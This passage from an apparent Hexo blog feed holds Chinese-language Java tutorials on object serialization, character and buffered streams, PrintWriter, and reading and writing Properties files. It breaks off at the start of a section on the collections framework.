class="hljs-string">&quot;src/main/java/com/Serializable/test.bin&quot;</span>);<br>        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(fis);<br>        <span class="hljs-comment">//反序列化（读取）</span><br>        Person pp = (Person) ois.readObject(); <br>        <span class="hljs-comment">//Person pp1 = (Person) ois.readObject(); //如果再一次执行本句，则会报错</span><br>        ois.close();<br>        System.out.println(pp.toString());<br>    &#125;<br><br><span class="hljs-comment">//输出结果</span><br>Person&#123;name=<span class="hljs-string">&#x27;zhangsan&#x27;</span>, age=<span class="hljs-number">23</span>&#125;<br></code></pre></div></td></tr></table></figure><blockquote><p>注意事项：</p></blockquote><ul><li><ol><li>序列化类必须要实现Serializable接口。</li></ol></li><li><ol start="2"><li>序列化类中对象属性要求实现Serializable接口。</li></ol></li><li><ol start="3"><li>序列化版本号ID，保证序列化的类和反序列化的类是同一个类。</li></ol></li><li><ol start="4"><li>使用transient（瞬间）修饰属性，这个属性不能序列化。即不会保存。</li></ol></li><li><ol start="5"><li>静态属性不能序列化。即static修饰的。</li></ol></li><li><ol start="6"><li>序列化多个对象时，可以借助集合实现。</li></ol></li></ul><h2 id="5-字符流"><a href="#5-字符流" class="headerlink" title="5.字符流"></a>5.字符流</h2><h3 id="5-1-输入流（Reader）"><a href="#5-1-输入流（Reader）" class="headerlink" title="5.1 输入流（Reader）"></a>5.1 输入流（Reader）</h3><p>FileReader是Reader的一个子类，它可以打开文件并获取Reader。<br>FileReader默认的编码与系统相关。例如，Windows系统的默认编码可能是GBK，打开一个UTF-8编码的文本文件就会出现乱码。若要避免乱码问题，我们需要在创建FileReader时指定编码：Reader reader = new FileReader(“src/readme.txt”, StandardCharsets.UTF_8);</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">//dataTest.txt</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">你好世界helloworld！</span><br><span class="hljs-comment">*/</span><br><br><br><span class="hljs-comment">//单个字符读取</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception</span>&#123;<br>        FileReader fr = <span class="hljs-keyword">new</span> FileReader(<span class="hljs-string">&quot;src/main/java/com/IO/dataTest.txt&quot;</span>);<br>        <span class="hljs-keyword">int</span> cnt = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">while</span>((cnt = fr.read())!=-<span class="hljs-number">1</span>)&#123;<br>            System.out.print((<span class="hljs-keyword">char</span>)cnt);<br>        &#125;<br>        System.out.println();<br>        fr.close();<br>    &#125;<br><br><br><span class="hljs-comment">//利用缓冲区读取</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception</span>&#123;<br>        FileReader fr = <span class="hljs-keyword">new</span> FileReader(<span class="hljs-string">&quot;src/main/java/com/IO/dataTest.txt&quot;</span>);<br>        <span class="hljs-keyword">char</span>[] ca = <span class="hljs-keyword">new</span> <span class="hljs-keyword">char</span>[<span class="hljs-number">1024</span>];<br>        <span class="hljs-keyword">int</span> cnt = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">while</span>((cnt = fr.read(ca))!=-<span class="hljs-number">1</span>)&#123;<br>            System.out.print(<span class="hljs-keyword">new</span> String(ca,<span class="hljs-number">0</span>,cnt));<br>        &#125;<br>        System.out.println();<br>        fr.close();<br>    &#125;<br><br><br><br><span class="hljs-comment">//输出结果均为</span><br>你好世界helloworld！<br></code></pre></div></td></tr></table></figure><h3 id="5-2-输出流（Writer）"><a href="#5-2-输出流（Writer）" class="headerlink" title="5.2 输出流（Writer）"></a>5.2 输出流（Writer）</h3><p>FileWriter就是向文件中写入字符流的Writer。它的使用方法和FileReader类似。</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception</span>&#123;<br>        FileWriter fw = <span class="hljs-keyword">new</span> FileWriter(<span class="hljs-string">&quot;src/main/java/com/IO/wdata.txt&quot;</span>);<br>        <span class="hljs-keyword">for</span> ( <span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span> ; i &lt; <span class="hljs-number">3</span> ; ++i)&#123;<br>            fw.write(<span class="hljs-string">&quot;这是一个写入样例&quot;</span>);<br>            fw.flush();<br>        &#125;<br>        System.out.println(<span class="hljs-string">&quot;OK&quot;</span>);<br>        fw.close();<br>    &#125;<br><br><span class="hljs-comment">//wdata.txt</span><br>这是一个写入样例这是一个写入样例<br></code></pre></div></td></tr></table></figure><h3 id="5-3-演示示例（复制功能）"><a href="#5-3-演示示例（复制功能）" class="headerlink" title="5.3 演示示例（复制功能）"></a>5.3 演示示例（复制功能）</h3><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">//不能复制图片或二进制文件，因为是字符</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception</span>&#123;<br>        FileReader fr = <span class="hljs-keyword">new</span> FileReader(<span class="hljs-string">&quot;src/main/java/com/IO/wdata.txt&quot;</span>);<br>        FileWriter fw = <span class="hljs-keyword">new</span> FileWriter(<span class="hljs-string">&quot;src/main/java/com/IO/wdata77.txt&quot;</span>);<br>        <span class="hljs-keyword">int</span> cnt = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">while</span>((cnt = fr.read()) != -<span class="hljs-number">1</span>)&#123;<br>            fw.write(cnt);<br>            fw.flush();<br>        &#125;<br>        fw.close();<br>        System.out.println(<span class="hljs-string">&quot;OK&quot;</span>);<br>    &#125;<br><br><span class="hljs-comment">//wdata.txt</span><br>这是一个写入样例这是一个写入样例<br><span class="hljs-comment">//wdata77.txt</span><br>这是一个写入样例这是一个写入样例<br></code></pre></div></td></tr></table></figure><h2 id="6-字符缓冲流"><a href="#6-字符缓冲流" class="headerlink" title="6.字符缓冲流"></a>6.字符缓冲流</h2><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">//wdata.txt</span><br>这是一个写入样例<br>这是一个写入样例<br></code></pre></div></td></tr></table></figure><blockquote><ol><li>BufferedReader</li></ol></blockquote><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">//方法一</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception</span>&#123;<br>        FileReader fr = <span class="hljs-keyword">new</span> FileReader(<span class="hljs-string">&quot;src/main/java/com/IO/wdata.txt&quot;</span>);<br>        BufferedReader br = <span class="hljs-keyword">new</span> BufferedReader(fr);<br><br>        <span class="hljs-keyword">char</span>[] ca = <span class="hljs-keyword">new</span> <span class="hljs-keyword">char</span>[<span class="hljs-number">1024</span>];<br>        <span class="hljs-keyword">int</span> cnt = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">while</span>((cnt = br.read(ca))!=-<span class="hljs-number">1</span>)&#123;<br>            System.out.println(<span class="hljs-keyword">new</span> String(ca,<span class="hljs-number">0</span>,cnt));<br>        &#125;<br>        <br>        br.close();<br>    &#125;<br><br><br><br><span class="hljs-comment">//=============================================</span><br><span class="hljs-comment">//方法二 一行一行读取</span><br><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception</span>&#123;<br>        FileReader fr = <span class="hljs-keyword">new</span> FileReader(<span class="hljs-string">&quot;src/main/java/com/IO/wdata.txt&quot;</span>);<br>        BufferedReader br = <span class="hljs-keyword">new</span> BufferedReader(fr);<br><br>        String st = <span class="hljs-keyword">null</span>;<br>        <span class="hljs-keyword">while</span>((st = br.readLine())!=<span class="hljs-keyword">null</span>)&#123;<br>            System.out.println(st);<br>        &#125;<br><br>        br.close();<br>    &#125;<br><br><br><br><span class="hljs-comment">//输出均为</span><br>这是一个写入样例<br>这是一个写入样例<br></code></pre></div></td></tr></table></figure><blockquote><ol start="2"><li>BufferedWriter</li></ol></blockquote><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception</span>&#123;<br>        FileWriter fw = <span class="hljs-keyword">new</span> FileWriter(<span class="hljs-string">&quot;src/main/java/com/IO/wwdata.txt&quot;</span>);<br>        BufferedWriter bw = <span class="hljs-keyword">new</span> BufferedWriter(fw);<br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span> ; i &lt; <span class="hljs-number">5</span> ; ++i )&#123;<br>            bw.write(<span class="hljs-string">&quot;好好学习，天天向上&quot;</span>); <span class="hljs-comment">//可以手动加上换行符，但不推荐</span><br>            bw.newLine();<span class="hljs-comment">//写入一个换行，兼容性更好。根据不同的系统自动写入不同的换行符。</span><br>            bw.flush();<br>        &#125;<br>        bw.close();<br>    &#125;<br><br><span class="hljs-comment">//wwdata.txt</span><br>好好学习，天天向上<br>好好学习，天天向上<br>好好学习，天天向上<br>好好学习，天天向上<br></code></pre></div></td></tr></table></figure><h2 id="7-打印流"><a href="#7-打印流" class="headerlink" title="7.打印流"></a>7.打印流</h2><p>PrintWriter 与 PrintStream 同样的用法。</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception</span>&#123;<br>        PrintWriter pw = <span class="hljs-keyword">new</span> PrintWriter(<span class="hljs-string">&quot;src/main/java/com/IO/wwdata.txt&quot;</span>);<br>        pw.println(<span class="hljs-number">23</span>);<br>        pw.println(<span class="hljs-string">&#x27;v&#x27;</span>);<br>        pw.println(<span class="hljs-keyword">true</span>);<br>        pw.println(<span class="hljs-number">3.243</span>);<br>        pw.close();<br>    &#125;<br><br><span class="hljs-comment">//wwdata.txt</span><br><span class="hljs-number">23</span><br>v<br><span class="hljs-keyword">true</span><br><span class="hljs-number">3.243</span><br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>JAVA</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JAVA</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>星星之火-JAVA-Properties的简单使用</title>
    <link href="/2021/08/05/%E6%98%9F%E6%98%9F%E4%B9%8B%E7%81%AB/%E6%98%9F%E6%98%9F%E4%B9%8B%E7%81%AB-JAVA-Properties%E7%9A%84%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/"/>
    <url>/2021/08/05/%E6%98%9F%E6%98%9F%E4%B9%8B%E7%81%AB/%E6%98%9F%E6%98%9F%E4%B9%8B%E7%81%AB-JAVA-Properties%E7%9A%84%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<p>积土成山，风雨兴焉；积水成渊，蛟龙生焉；积善成德，而神明自得，圣心备焉。故不积跬步，无以至千里，不积小流无以成江海。齐骥一跃，不能十步，驽马十驾，功不在舍。面对悬崖峭壁，一百年也看不出一条裂缝来，但用斧凿，能进一寸进一寸，能进一尺进一尺，不断积累，飞跃必来，突破随之。</p><h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><p>Java集合库提供了一个Properties来表示一组“配置”。由于历史遗留原因，Properties内部本质上是一个Hashtable，但我们只需要用到Properties自身关于读写配置的接口。配置文件的特点是，它的Key-Value一般都是String-String类型的。</p><h2 id="1-读取配置文件"><a href="#1-读取配置文件" class="headerlink" title="1.读取配置文件"></a>1.读取配置文件</h2><p>用Properties读取配置文件，一共有三步：</p><ul><li><ol><li>创建Properties实例；</li></ol></li><li><ol start="2"><li>调用load()读取文件；</li></ol></li><li><ol start="3"><li>调用getProperty()获取配置。</li></ol></li></ul><p>调用getProperty()获取配置时，如果key不存在，将返回null。我们还可以提供一个默认值，这样，当key不存在的时候，就返回默认值。</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">//data.properties </span><br>url = <span class="hljs-string">&quot;www.tothefor.com&quot;</span><br>author = <span class="hljs-string">&quot;dragonone&quot;</span><br>date = <span class="hljs-string">&quot;234324&quot;</span><br>name = <span class="hljs-string">&quot;tothefor&quot;</span><br><br><br><span class="hljs-comment">//主函数</span><br>String file = <span class="hljs-string">&quot;src/main/data.properties&quot;</span>; <span class="hljs-comment">//配置文件的位置</span><br>        Properties pro = <span class="hljs-keyword">new</span> Properties();<br>       <span class="hljs-comment">// pro.load(new java.io.FileInputStream(file));</span><br>        pro.load(<span class="hljs-keyword">new</span> FileInputStream(file));<br>        String url = pro.getProperty(<span class="hljs-string">&quot;url&quot;</span>);<br>        String age = pro.getProperty(<span class="hljs-string">&quot;age&quot;</span>,<span class="hljs-string">&quot;123&quot;</span>); <span class="hljs-comment">//没有则返回默认值 123</span><br>        System.out.println(url);<br>        System.out.println(age);<br><br><span class="hljs-comment">//输出</span><br><span class="hljs-string">&quot;www.tothefor.com&quot;</span><br><span class="hljs-number">123</span><br></code></pre></div></td></tr></table></figure><h2 id="2-写入配置文件"><a href="#2-写入配置文件" class="headerlink" title="2.写入配置文件"></a>2.写入配置文件</h2><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">//在已有的配置文件中写入</span><br>String file = <span class="hljs-string">&quot;src/main/java/com/propreties/data.properties&quot;</span>;<br>        Properties pro = <span class="hljs-keyword">new</span> Properties();<br>        pro.load(<span class="hljs-keyword">new</span> FileInputStream(file));<br>        pro.setProperty(<span class="hljs-string">&quot;url2&quot;</span>, <span class="hljs-string">&quot;www.tothefor.com&quot;</span>);<br>        pro.setProperty(<span class="hljs-string">&quot;language&quot;</span>, <span class="hljs-string">&quot;Java&quot;</span>);<br>        pro.store(<span class="hljs-keyword">new</span> FileOutputStream(<span class="hljs-string">&quot;src/main/java/com/propreties/data.properties&quot;</span>), <span class="hljs-string">&quot;two commit&quot;</span>);<br><br><span class="hljs-comment">//data.properties</span><br>#two commit<br>#Thu Aug 05 16:41:21 CST 2021<br>url=<span class="hljs-string">&quot;www.tothefor.com&quot;</span><br>date=<span class="hljs-string">&quot;234324&quot;</span><br>name=<span class="hljs-string">&quot;tothefor&quot;</span><br>author=<span class="hljs-string">&quot;dragonone&quot;</span><br>url2=www.tothefor.com<br>language=Java<br><br><br><br><span class="hljs-comment">//==============================================</span><br><span class="hljs-comment">//写入新建配置文件</span><br>Properties pro = <span class="hljs-keyword">new</span> Properties();<br>        pro.setProperty(<span class="hljs-string">&quot;url2&quot;</span>, <span class="hljs-string">&quot;www.tothefor.com&quot;</span>);<br>        pro.setProperty(<span class="hljs-string">&quot;language&quot;</span>, <span class="hljs-string">&quot;Java&quot;</span>);<br>        pro.store(<span class="hljs-keyword">new</span> FileOutputStream(<span class="hljs-string">&quot;src/main/java/com/propreties/data1.properties&quot;</span>), <span class="hljs-string">&quot;two commit&quot;</span>);<br><br><span class="hljs-comment">//data1.properties</span><br>#two commit<br>#Thu Aug 05 16:43:46 CST 2021<br>url2=www.tothefor.com<br>language=Java<br><br></code></pre></div></td></tr></table></figure><h2 id="3-中文乱码解决"><a href="#3-中文乱码解决" class="headerlink" title="3.中文乱码解决"></a>3.中文乱码解决</h2><h3 id="3-1-读取中文"><a href="#3-1-读取中文" class="headerlink" title="3.1 读取中文"></a>3.1 读取中文</h3><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">//data.properties</span><br>#two commit<br>#Thu Aug 05 16:41:21 CST 2021<br>url=<span class="hljs-string">&quot;www.tothefor.com&quot;</span><br>date=<span class="hljs-string">&quot;234324&quot;</span><br>name=<span class="hljs-string">&quot;tothefor&quot;</span><br>author=<span class="hljs-string">&quot;dragonone&quot;</span><br>url2=www.tothefor.com<br>language=Java<br>test = 中文状态<br><br><br><span class="hljs-comment">//=========================================</span><br><span class="hljs-comment">//主函数</span><br>String file = <span class="hljs-string">&quot;src/main/java/com/propreties/data.properties&quot;</span>;<br>        Properties pro = <span class="hljs-keyword">new</span> Properties();<br>        InputStream in = <span class="hljs-keyword">new</span> BufferedInputStream(<span class="hljs-keyword">new</span> FileInputStream(file));<br>        pro.load(<span class="hljs-keyword">new</span> InputStreamReader(in));<br>        String url = pro.getProperty(<span class="hljs-string">&quot;test&quot;</span>);<br>        String age = pro.getProperty(<span class="hljs-string">&quot;age&quot;</span>,<span class="hljs-string">&quot;123&quot;</span>);<br>        System.out.println(url);<br>        System.out.println(age);<br><br><span class="hljs-comment">//输出结果</span><br>中文状态<br><span class="hljs-number">123</span><br></code></pre></div></td></tr></table></figure><h3 id="3-2-写入中文"><a href="#3-2-写入中文" class="headerlink" title="3.2 写入中文"></a>3.2 写入中文</h3><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">//主函数</span><br>String file = <span class="hljs-string">&quot;src/main/java/com/propreties/data1.properties&quot;</span>;<br>        Properties pro = <span class="hljs-keyword">new</span> Properties();<br><br>        pro.setProperty(<span class="hljs-string">&quot;testinch&quot;</span>,<span class="hljs-string">&quot;测试写入中文&quot;</span>);<br>        FileOutputStream oFile = <span class="hljs-keyword">new</span> FileOutputStream(file,<span class="hljs-keyword">true</span>);<span class="hljs-comment">//true表示追加打开,false每次都是清空再重写,没有此文件则新建一个</span><br>        pro.store(<span class="hljs-keyword">new</span> OutputStreamWriter(oFile, <span class="hljs-string">&quot;utf-8&quot;</span>), <span class="hljs-string">&quot;lll&quot;</span>); <span class="hljs-comment">//111为注释，不能为中文，否则会出现乱码</span><br><br><br><br><span class="hljs-comment">//===============================================</span><br><span class="hljs-comment">//data1.properties</span><br>#lll<br>#Thu Aug 05 17:10:19 CST 2021<br>testinch=测试写入中文<br><br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>星星之火</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JAVA</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JAVA基础学习-集合</title>
    <link href="/2021/08/05/JAVA/JAVA%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0-%E9%9B%86%E5%90%88/"/>
    <url>/2021/08/05/JAVA/JAVA%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0-%E9%9B%86%E5%90%88/</url>
    
    <content type="html"><![CDATA[<p>Java 集合框架主要包括两种类型的容器，一种是集合（Collection），存储一个元素集合，另一种是图（Map），存储键/值对映射。Collection 接口又有 3 种子类型，List、Set 和 Queue，再下面是一些抽象类，最后是具体实现类，常用的有 ArrayList、LinkedList、HashSet、LinkedHashSet、HashMap、LinkedHashMap 等等。Java 集合框架提供了一套性能优良，使用方便的接口和类，java集合框架位于java.util包中。</p><h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><p><img src="https://img-blog.csdnimg.cn/72e09cb3c3e24b49b6dc2cf94d29f0f1.png"></p><p><img src="https://img-blog.csdnimg.cn/172118103b55450b9a19ad7a03a44a59.png"></p><p><img src="https://img-blog.csdnimg.cn/09b2da2a00b945639b34e259c1c1a3a2.gif"></p><h2 id="1-Collection"><a href="#1-Collection" class="headerlink" title="1.Collection"></a>1.Collection</h2><p>Java标准库自带的java.util包提供了集合类：Collection，它是除Map外所有其他集合类的根接口。Java的java.util包主要提供了以下三种类型的集合：</p><ul><li><p>List：一种有序列表的集合。</p></li><li><p>Set：一种保证没有重复元素的集合。</p></li><li><p>Map：一种通过键值（key-value）查找的映射表集合。</p></li></ul><h3 id="1-List"><a href="#1-List" class="headerlink" title="1.List"></a>1.List</h3><p>在集合类中，List是最基础的一种集合：它是一种有序列表。List的行为和数组几乎完全相同：List内部按照放入元素的先后顺序存放，每个元素都可以通过索引确定自己的位置，List的索引和数组一样，从0开始。在实际应用中，需要增删元素的有序列表，使用最多的是ArrayList。</p><p>几个主要的接口方法：</p><ul><li>在末尾添加一个元素：<code>boolean add(E e)</code></li><li>在指定索引添加一个元素：<code>boolean add(int index, E e)</code></li><li>删除指定索引的元素：<code>E remove(int index)</code></li><li>删除某个元素：<code>boolean remove(Object e)</code></li><li>获取指定索引的元素：<code>E get(int index)</code></li><li>获取链表大小（包含元素的个数）：<code>int size()</code></li></ul><h4 id="1-1-ArrayList"><a href="#1-1-ArrayList" class="headerlink" title="1.1 ArrayList"></a>1.1 ArrayList</h4><p>ArrayList 常用方法：</p><table><thead><tr><th align="center">方法</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">add()</td><td align="center">将元素插入到指定位置的 arraylist 中</td></tr><tr><td align="center">addAll()</td><td align="center">添加集合中的所有元素到 arraylist 中</td></tr><tr><td align="center">clear()</td><td align="center">删除 arraylist 中的所有元素</td></tr><tr><td align="center">clone()</td><td align="center">复制一份 arraylist</td></tr><tr><td align="center">contains()</td><td align="center">判断元素是否在 arraylist</td></tr><tr><td align="center">get()</td><td align="center">通过索引值获取 arraylist 中的元素</td></tr><tr><td align="center">indexOf()</td><td align="center">返回 arraylist 中元素的索引值</td></tr><tr><td align="center">removeAll()</td><td align="center">删除存在于指定集合中的 arraylist 里的所有元素</td></tr><tr><td align="center">remove()</td><td align="center">删除 arraylist 里的单个元素</td></tr><tr><td align="center">size()</td><td align="center">返回 arraylist 里元素数量</td></tr><tr><td align="center">isEmpty()</td><td align="center">判断 arraylist 是否为空</td></tr><tr><td align="center">subList()</td><td align="center">截取部分 arraylist 的元素</td></tr><tr><td align="center">set()</td><td align="center">替换 arraylist 中指定索引的元素</td></tr><tr><td align="center">sort()</td><td align="center">对 arraylist 元素进行排序</td></tr><tr><td align="center">toArray()</td><td align="center">将 arraylist 转换为数组</td></tr><tr><td align="center">toString()</td><td align="center">将 arraylist 转换为字符串</td></tr><tr><td align="center">ensureCapacity()</td><td align="center">设置指定容量大小的 arraylist</td></tr><tr><td align="center">lastIndexOf()</td><td align="center">返回指定元素在 arraylist 中最后一次出现的位置</td></tr><tr><td align="center">retainAll()</td><td align="center">保留 arraylist 中在指定集合中也存在的那些元素</td></tr><tr><td align="center">containsAll()</td><td align="center">查看 arraylist 是否包含指定集合中的所有元素</td></tr><tr><td align="center">trimToSize()</td><td align="center">将 arraylist 中的容量调整为数组中的元素个数</td></tr><tr><td align="center">removeRange()</td><td align="center">删除 arraylist 中指定索引之间存在的元素</td></tr><tr><td align="center">replaceAll()</td><td align="center">将给定的操作内容替换掉数组中每一个元素</td></tr><tr><td align="center">removeIf()</td><td align="center">删除所有满足特定条件的 arraylist 元素</td></tr><tr><td align="center">forEach()</td><td align="center">遍历 arraylist 中每一个元素并执行特定操作</td></tr></tbody></table><h5 id="1-1-1-添加元素"><a href="#1-1-1-添加元素" class="headerlink" title="1.1.1 添加元素"></a>1.1.1 添加元素</h5><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span 